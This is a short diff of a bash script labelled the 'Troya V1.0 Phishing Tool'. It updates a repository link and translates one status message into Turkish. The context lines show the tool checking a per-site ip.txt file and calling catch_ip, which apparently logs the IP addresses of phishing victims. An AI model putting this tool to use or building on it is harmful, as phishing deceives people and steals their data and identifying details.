@@ -1,7 +1,6 @@
 #!/bin/bash
 #  Troya V1.0 Phishing Tool 
-# Upgrade by: @emretmh https://github.com/emretmh/TroyaV1.0.git
-
+# Upgrade by: @emretmh https://github.com/emretmh/troya-phishing.git
 
 trap 'printf "\n";stop;exit 1' 2
 
@@ -368,7 +367,7 @@ while [ true ]; do
 
 
 if [[ -e "sites/$server/ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+printf "\n\e[1;92m[\e[0m*\e[1;92m] ip bulundu!\n"
 catch_ip
 
 fi
